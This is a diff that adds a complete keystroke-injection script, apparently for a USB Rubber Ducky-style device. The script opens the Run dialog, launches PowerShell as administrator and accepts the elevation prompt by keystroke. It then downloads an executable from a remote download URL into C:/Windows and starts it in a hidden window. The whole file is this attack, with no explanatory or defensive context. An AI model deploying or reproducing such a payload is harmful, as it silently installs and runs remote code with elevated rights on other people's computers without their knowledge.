@@ -1,0 +1,15 @@
+DELAY 1000
+WINDOWS d
+DELAY 1500
+WINDOWS r
+DELAY 1500
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 560
+LEFTARROW
+DELAY 500
+ENTER
+DELAY 700
+STRING Invoke-WebRequest -Uri https://en.softonic.com/download-launch?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkb3dubG9hZFR5cGUiOiJyaXNlSW5zdGFsbGVyIiwiZG93bmxvYWRVcmwiOiJodHRwczovL2QxbTE1MTFpNzR6YmR1LmNsb3VkZnJvbnQubmV0L3Zlci9jYS92Ni44Ni4zNy44OS42NC40IiwiYXBwSWQiOiIyMTYzYjgxZC01MmNkLTQwMzktOGI1NS0zYzAwZTk4YjdjYTciLCJwbGF0Zm9ybUlkIjoid2luZG93cyIsImlhdCI6MTY4Nzk4Nzk5MiwiZXhwIjoxNjg3OTkxNTkyfQ.RAirrNxQlZ6ZWXqxMJKBsNbTS1WIh9xZpxdsTZ5VGWk
+ -OutFile C:/Windows/6565.exe; Start-Process -FilePath "C:/windows/6565.exe" -WindowStyle hidden
+ENTER
